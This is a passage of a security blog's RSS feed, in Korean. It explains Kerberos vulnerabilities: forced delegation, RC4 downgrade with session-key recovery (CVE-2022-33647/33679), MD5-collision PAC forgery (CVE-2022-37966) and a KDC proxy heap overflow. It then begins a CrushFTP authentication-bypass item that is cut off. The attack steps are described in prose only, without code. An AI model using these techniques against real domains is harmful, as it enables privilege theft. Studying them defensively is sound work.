&#xAD6C;&#xD604;&#xD588;&#xB294;&#xB370;&#xC694;. &#xB9CC;&#xC57D; &#xC11C;&#xBE44;&#xC2A4; A&#xAC00; &#xC11C;&#xBE44;&#xC2A4; B&#xB85C; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC774; &#xB420; &#xB54C; A &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xB9CC; &#xAC00;&#xC9C0;&#xACE0;&#xC11C;&#xB294; &#xC11C;&#xBE44;&#xC2A4; B&#xC5D0; &#xC694;&#xCCAD;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. S4U2proxy &#xB97C; &#xD1B5;&#xD574; KDC&#xC5D0; A &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xC81C;&#xC2DC;&#xD558;&#xACE0; B &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; Forwardable flag&#xB97C; 1&#xB85C; &#xC124;&#xC815;&#xD558;&#xC5EC; &#xAC15;&#xC81C;&#xC801;&#xC73C;&#xB85C; &#xAD8C;&#xD55C; &#xC704;&#xC784;&#xC744; &#xC720;&#xBC1C;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2022-33647-amp-CVE-2022-33679"><a href="#CVE-2022-33647-amp-CVE-2022-33679" class="headerlink" title="CVE-2022-33647 &amp; CVE-2022-33679"></a>CVE-2022-33647 &amp; CVE-2022-33679</h2><p><strong>CVE-2022-33647</strong>&#xACFC; <strong>CVE-2022-33679</strong>&#xB294; &#xAD6C;&#xAE00; Project Zero &#xC758; James Forshaw &#xAC00; &#xBC1C;&#xACAC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, Kerberos &#xC778;&#xC99D; &#xACFC;&#xC815; &#xC911; RC4 &#xC554;&#xD638;&#xD654; &#xC0AC;&#xC6A9;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xC5EC; &#xBE0C;&#xB8E8;&#xD2B8;&#xD3EC;&#xC2A4; &#xB4F1;&#xC758; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654; &#xD558;&#xACE0; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. Kerberos &#xAC00; &#xC6D0;&#xB798;&#xB294; AES &#xAE30;&#xBC18; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC120;&#xD638;&#xD558;&#xC9C0;&#xB9CC; &#xD558;&#xC704; &#xD638;&#xD658;&#xC131; &#xB54C;&#xBB38;&#xC5D0; RC4-HMAC(MD4) &#xBC29;&#xC2DD;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xAE30;&#xC5D0; &#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70;&#xC5D0;&#xC11C;&#xB294; RC4 &#xB97C; &#xAC15;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; AS-REQ &#xB97C; KDC&#xC5D0; &#xC804;&#xB2EC;&#xD560; &#xB54C; etype &#xC774;&#xB77C;&#xB294; &#xC815;&#xC218;&#xD615; &#xD544;&#xB4DC;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC9C0;&#xC6D0; &#xAC00;&#xB2A5;&#xD55C; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC11C;&#xBC84;&#xB294; &#xC774;&#xB97C; &#xBC1B;&#xACE0;&#xC11C; &#xC9C0;&#xC6D0; &#xAC00;&#xB2A5;&#xD55C; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xBA74; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC81C;&#xC2DC;&#xD55C; &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p>CVE-2022-33647 &#xB97C; Exploit &#xD558;&#xAE30; &#xC704;&#xD574; Forshaw &#xD615;&#xB2D8;&#xC774; &#xC0AC;&#xC6A9;&#xD55C; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xAC00; &#xB180;&#xB77C;&#xC6B4;&#xB370;&#xC694;. &#xD55C; &#xBC88; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC778;&#xC99D;&#xD560; &#xB54C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC804; &#xC778;&#xC99D; &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504;&#xAC00; &#xC5C6;&#xB294; &#xC694;&#xCCAD;&#xC744; KDC&#xC5D0; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. KDC&#xB294; &#xADF8;&#xB7EC;&#xBA74; KDC_ERR_PREAUTH_REQUIRED &#xB77C;&#xB294; &#xC5D0;&#xB7EC; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD574;&#xC11C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC624;&#xB958; &#xC751;&#xB2F5;&#xC5D0;&#xC11C;&#xB294; &#xD544;&#xC694;&#xD55C; &#xC554;&#xD638;&#xD654; &#xBAA9;&#xB85D; &#xB4F1;&#xC744; &#xC2E4;&#xC5B4;&#xC11C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC801;&#xC808;&#xD558;&#xAC8C; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xB294;&#xB370;&#xC694;. MITM &#xC744; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; AS-REQ &#xB97C; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xC5D0;&#xB7EC;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74;&#xC11C; &#xC5D0;&#xB7EC;&#xC5D0; RC4-MD4 &#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xB123;&#xC5B4; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; RC4-MD4 &#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. RC4&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; AS-REQ &#xB97C; &#xB9B4;&#xB808;&#xC774;&#xD558;&#xC5EC; KDC&#xC5D0; &#xBCF4;&#xB0B4;&#xC5B4; AS-REP &#xB97C; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC790; &#xADF8;&#xB7EC;&#xBA74;, &#xACF5;&#xACA9;&#xC790;&#xB294; RC4&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; AS-REQ &#xC640; AS-REP &#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xC138;&#xC158;&#xD0A4;&#xC640; TGT&#xB97C; &#xC5BB;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. AS-REQ &#xC5D0;&#xB294; PA-ENC-TS-ENC &#xB77C;&#xACE0; &#xD558;&#xB294; &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xAC00; &#xC788;&#xACE0; AS-REP &#xB294; EncASRepPart &#xB77C;&#xACE0; &#xD558;&#xB294; &#xC554;&#xD638;&#xD654; &#xC751;&#xB2F5; &#xAD6C;&#xC870;&#xB85C; &#xC774;&#xB904;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/ko/4.png" alt></p><p>RC4 &#xB294; &#xC0DD;&#xC131;&#xB41C; &#xC2A4;&#xD2B8;&#xB9BC; &#xD0A4;&#xB85C; XOR &#xC744; &#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4; &#xBCF4;&#xB2C8;, &#xC554;&#xD638;&#xBB38;&#xACFC; &#xD3C9;&#xBB38;&#xC744; &#xC54C;&#xACE0; &#xC788;&#xC73C;&#xBA74; &#xC2A4;&#xD2B8;&#xB9BC; &#xD0A4;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; &#xADF8;&#xB9BC;&#xC5D0;&#xC11C; &#xC591; &#xCABD;&#xC774; &#xB178;&#xB780;&#xC0C9;&#xC778; &#xACBD;&#xC6B0; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xACC4;&#xC0B0;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC774;&#xC8E0;.</p><ul><li>RC4-MD4 &#xBC29;&#xC2DD;&#xC740; 16&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xC55E; 5&#xBC14;&#xC774;&#xD2B8;&#xB9CC; &#xB79C;&#xB364;&#xC774;&#xACE0; 11&#xBC14;&#xC774;&#xD2B8;&#xB294; 0xAB&#xB85C; &#xACE0;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</li></ul><p>&#xCD08;&#xB85D;&#xC0C9; &#xD45C;&#xC2DC;&#xB294; ASN.1 &#xAD6C;&#xC870;&#xC774;&#xAE30;&#xC5D0; &#xC54C;&#xACE0; &#xC788;&#xAC70;&#xB098; &#xACC4;&#xC0B0;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. &#xC6B4;&#xC774; &#xC88B;&#xAC8C;&#xB3C4; &#xC138;&#xC158;&#xD0A4;&#xC758; 4&#xBC14;&#xC774;&#xD2B8; &#xC815;&#xB3C4;&#xAC00; overlap &#xB418;&#xC5B4; &#xC788;&#xAE30;&#xC5D0; &#xBCF5;&#xD638;&#xD654;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xACE0; 1&#xBC14;&#xC774;&#xD2B8;&#xB294; &#xBE0C;&#xB8E8;&#xD2B8;&#xD3EC;&#xC2A4;&#xB97C; &#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xBE0C;&#xB8E8;&#xD2B8;&#xD3EC;&#xC2A4;&#xB294; KDC&#xC5D0; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; 256&#xBC88; &#xC694;&#xCCAD;&#xD558;&#xC5EC; &#xC815;&#xC0C1; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xBC1C;&#xAE09; &#xBC1B;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xC774;&#xB807;&#xAC8C; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xC5BB;&#xC5B4;&#xB0B4;&#xACE0; &#xD2F0;&#xCF13; &#xBCF5;&#xD638;&#xD654;&#xAE4C;&#xC9C0; &#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CVE-2022-33679&#xC758; &#xACBD;&#xC6B0;&#xB294; Keberos &#xC758; &#xC0AC;&#xC804; &#xC778;&#xC99D; (pre-authentication) &#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0;&#xC5D0; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC804; &#xC778;&#xC99D;&#xC774; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xB41C; &#xACC4;&#xC815;&#xC774; &#xC788;&#xC73C;&#xBA74;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD574;&#xB2F9; &#xACC4;&#xC815;&#xC5D0; &#xB300;&#xD574; &#xC9C1;&#xC811; KDC&#xC5D0; AS-REQ &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4; RC4-MD4 &#xBC29;&#xC2DD;&#xC758; TGT&#xB97C; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0AC;&#xC804; &#xC778;&#xC99D;&#xC774; &#xAEBC;&#xC838; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; KDC&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC99D;&#xBA85;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB294;&#xB370;&#xB3C4; KDC&#xB294; AS-REP&#xB97C; &#xB97C; &#xD1B5;&#xD574; RC4 &#xC554;&#xD638;&#xD654;&#xB41C; TGT &#xC640; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; Exploit &#xD560; &#xB54C;&#xC5D0;&#xB294; &#xC138;&#xC158;&#xD0A4;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xB300;&#xC2E0;&#xC5D0; &#xC624;&#xB77C;&#xD074; &#xD328;&#xB529;&#xCC98;&#xB7FC; &#xD0C0;&#xC784;&#xC2A4;&#xD0EC;&#xD504; &#xB4A4;&#xCABD;&#xC73C;&#xB85C; &#xB110; &#xAC12;&#xC744; &#xBD99;&#xC5EC; &#xB098;&#xAC00; KDC&#xC5D0;&#xC11C; &#xC815;&#xC0C1; &#xC751;&#xB2F5;&#xC744; &#xD558;&#xBA74; &#xD0A4;&#xB97C; &#xC5BB;&#xC5B4;&#xB0B4;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2022-37966"><a href="#CVE-2022-37966" class="headerlink" title="CVE-2022-37966"></a>CVE-2022-37966</h2><p>CVE-2022-37966 &#xC740; 2022 &#xBE14;&#xB799;&#xD587; &#xC720;&#xB7FD;&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xB54C; &#xB2F9;&#xC2DC; Kerberos &#xC5D0;&#xC11C; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC9C0;&#xC6D0;&#xB418;&#xB358; RC4_HMAC_MD5 &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xC0AC;&#xC6A9; &#xC2DC; PAC &#xBCC0;&#xC870; &#xD6C4; MD5 &#xCF5C;&#xB9AC;&#xC83C;&#xC744; &#xD1B5;&#xD574; &#xAC80;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>PAC &#xB0B4;&#xC5D0;&#xB294; &#xC784;&#xC758;&#xC758; &#xBC14;&#xC774;&#xD2B8;&#xC5F4;&#xC744; &#xB123;&#xC744;&#xB9CC;&#xD55C;, &#xCEE8;&#xD2B8;&#xB864; &#xAC00;&#xB2A5;&#xD55C; &#xD544;&#xB4DC;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; LogonScript &#xD544;&#xB4DC;&#xB97C; &#xC4F0;&#xBA74; &#xAE34; &#xAE38;&#xC774;&#xC758; UTF-16 &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB123;&#xC744; &#xC218; &#xC788;&#xC5B4;&#xC11C; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; MD5 &#xCF5C;&#xB9AC;&#xC804;&#xC744; &#xC720;&#xBC1C;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; Exploit &#xD558;&#xB824;&#xBA74; &#xB3D9;&#xC77C;&#xD55C; MD5 hash &#xB97C; &#xAC00;&#xC9C0;&#xB294; &#xB3C4;&#xBA54;&#xC778; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC774; &#xD3EC;&#xD568;&#xB41C; PAC&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370;&#xC694;. &#xC2E4;&#xC81C; &#xC5F0;&#xAD6C;&#xC5D0;&#xC11C;&#xB3C4; HashClash&#xB85C; &#xC57D; 7 &#xC2DC;&#xAC04; &#xB3D9;&#xC548; &#xC18C;&#xC694;&#xB418;&#xC5C8;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xD55C; &#xBC88; &#xB9CC;&#xB4E4;&#xC5B4;&#xB0B4;&#xBA74; &#xB3C4;&#xBA54;&#xC778; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xC2DC;&#xAC04;&#xC744; &#xD22C;&#xC790;&#xD560;&#xB9CC; &#xD55C; &#xAC83; &#xAC19;&#xB124;&#xC694;. </p><h2 id="CVE-2024-43639"><a href="#CVE-2024-43639" class="headerlink" title="CVE-2024-43639"></a>CVE-2024-43639</h2><p>CVE-2024-43639 &#xB294; ZDI &#xC5D0; &#xC81C;&#xBCF4;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, KDC Proxy (kdcsvc) &#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Integer Overflow &#xC5D0; &#xC758;&#xD55C; Heap Overflow &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Windows KDC Proxy &#xB294; Kerberos &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; HTTP&#xB97C; &#xD1B5;&#xD574; &#xD504;&#xB85D;&#xC2DC; &#xD574;&#xC8FC;&#xB294; Windows Server &#xAD6C;&#xC131;&#xC694;&#xC18C; &#xC785;&#xB2C8;&#xB2E4;. kdcsvc &#xB77C;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; kpssvc.dll &#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xACC4;&#xC18D; Kerberos &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xB85C;&#xC9C0;&#xCEEC; &#xBC84;&#xADF8;&#xB9CC; &#xBCF4;&#xB2E4;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xBC84;&#xADF8;&#xB97C; &#xBCF4;&#xB2C8; &#xBC18;&#xAC11;&#xAE30;&#xB3C4; &#xD558;&#xACE0; &#xC2E0;&#xAE30;&#xD558;&#xAE30;&#xB3C4; &#xD558;&#xB124;&#xC694;.</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>Kerberos &#xC791;&#xB3D9; &#xC6D0;&#xB9AC;&#xC640; Windows &#xAD6C;&#xD604;, &#xAD00;&#xB828; &#xACF5;&#xACA9;&#xACFC; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xAE4C;&#xC9C0; &#xC0B4;&#xD3B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. Kerberos &#xB294; &#xAC15;&#xD55C; &#xC778;&#xC99D; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC774;&#xC9C0;&#xB9CC; &#xC124;&#xC815;&#xC0C1;&#xC758; &#xC624;&#xB958;&#xB098; &#xAD6C;&#xD604;&#xC0C1;&#xC758; &#xBBF8;&#xBE44;&#xB85C; &#xC778;&#xD574; &#xB2E4;&#xC591;&#xD55C; &#xACF5;&#xACA9;&#xACFC; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB178;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C;&#xC758; &#xC8FC;&#xC81C;&#xB294; &#xC544;&#xC9C1; &#xBBF8;&#xC815;&#xC774;&#xC9C0;&#xB9CC; &#xC7AC;&#xBC0C;&#xB294; &#xC8FC;&#xC81C;&#xB85C; &#xB2E4;&#xC2DC; &#xCC3E;&#xC544;&#xBD59;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4; &#x1F642;</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><p><a href="https://en.wikipedia.org/wiki/Kerberos_(protocol">https://en.wikipedia.org/wiki/Kerberos_(protocol)</a>)</p></li><li><p><a href="https://www.ibm.com/docs/ko/db2/11.5?topic=details-kerberos-authentication">https://www.ibm.com/docs/ko/db2/11.5?topic=details-kerberos-authentication</a></p></li><li><p><a href="https://www.varonis.com/blog/kerberos-attack-silver-ticket">https://www.varonis.com/blog/kerberos-attack-silver-ticket</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84</a></p></li><li><p><a href="https://learn.microsoft.com/ko-kr/openspecs/windows_protocols/ms-apds/a00d0b83-97e3-44ad-ba2d-1221d4f51a35#gt_26456104-0afb-4afe-a92e-ac160a9efdf8">https://learn.microsoft.com/ko-kr/openspecs/windows_protocols/ms-apds/a00d0b83-97e3-44ad-ba2d-1221d4f51a35#gt_26456104-0afb-4afe-a92e-ac160a9efdf8</a></p></li><li><p><a href="https://learn.microsoft.com/ko-kr/windows-server/security/credentials-protection-and-management/authentication-policies-and-authentication-policy-silos">https://learn.microsoft.com/ko-kr/windows-server/security/credentials-protection-and-management/authentication-policies-and-authentication-policy-silos</a></p></li><li><p><a href="https://blog.sunggwanchoi.com/kor-keobeoroseuting-kerberoasting/">https://blog.sunggwanchoi.com/kor-keobeoroseuting-kerberoasting/</a></p></li><li><p><a href="https://www.hackthebox.com/blog/as-rep-roasting-detection">https://www.hackthebox.com/blog/as-rep-roasting-detection</a></p></li><li><p><a href="https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/">https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/</a></p></li><li><p><a href="https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html">https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html</a></p></li><li><p><a href="https://syfuhs.net/a-bit-about-kerberos">https://syfuhs.net/a-bit-about-kerberos</a></p></li><li><p><a href="https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf">https://i.blackhat.com/EU-22/Thursday-Briefings/EU-22-Tervoort-Breaking-Kerberos-RC4-Cipher-and-Spoofing-Windows-PACs-wp.pdf</a></p></li><li><p><a href="https://www.thehacker.recipes/ad/movement/kerberos/">https://www.thehacker.recipes/ad/movement/kerberos/</a></p></li><li><p><a href="https://en.hackndo.com/kerberos-silver-golden-tickets/">https://en.hackndo.com/kerberos-silver-golden-tickets/</a></p></li><li><p><a href="https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/">https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-theory/</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview">https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview</a></p></li><li><p><a href="https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/">https://hackyboiz.github.io/2020/12/11/l0ch/2020-12-11/</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/4ce3ddc0-aaaa-4a1b-b48b-62a07e906926">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/4ce3ddc0-aaaa-4a1b-b48b-62a07e906926</a></p></li><li><p><a href="https://www.zerodayinitiative.com/blog/2025/3/3/cve-2024-43639">https://www.zerodayinitiative.com/blog/2025/3/3/cve-2024-43639</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Windows/">Windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/Authentication/">Authentication</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kerberos/">Kerberos</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-31161: CrushFTP의 파라미터 오버로딩으로 인한 인증 우회 취약점</title>
      <link>https://hackyboiz.github.io/2025/04/19/empty/CVE-2025-31161/</link>
      <guid>https://hackyboiz.github.io/2025/04/19/empty/CVE-2025-31161/</guid>
      <pubDate>Sat, 19 Apr 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://projectdiscovery.io/blog/crushftp-authentic</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://projectdiscovery.io/blog/crushftp-authentication-bypass">https://projectdiscovery.io/blog/crushftp-authentication-bypass</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>CrushFTP 11.0.0 &#x2264; 11.3.0</li><li>CrushFTP 10.0.0 &#x2264; 11.8.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p><em>&#xBCF8; &#xCDE8;&#xC57D;&#xC810;&#xC740; 3&#xC6D4; 21&#xC77C; CVE-2025-2825&#xB85C; &#xBD80;&#xC5EC;&#xB41C; &#xBC14; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBC1C;&#xACAC;&#xD55C; Outpost24&#xB294; &#xAD00;&#xB828; &#xB0B4;&#xC6A9;&#xC744; CrushFTP&#xC5D0; &#xC81C;&#xBCF4;&#xD558;&#xC5EC; &#xACE0;&#xAC1D;&#xB4E4;&#xC5D0;&#xAC8C; &#xBCF4;&#xC548; &#xAD8C;&#xACE0; &#xC548;&#xB0B4;&#xC640; MITRE&#xB97C; &#xD1B5;&#xD574; CVE &#xBC1C;&#xAE09;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xB358; &#xC911;, Vulncheck&#xC0AC;&#xB294; ITW&#xC5D0;&#xC11C; &#xC545;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC5B4; &#xBE60;&#xB978; &#xC870;&#xCE58;&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xBA70; 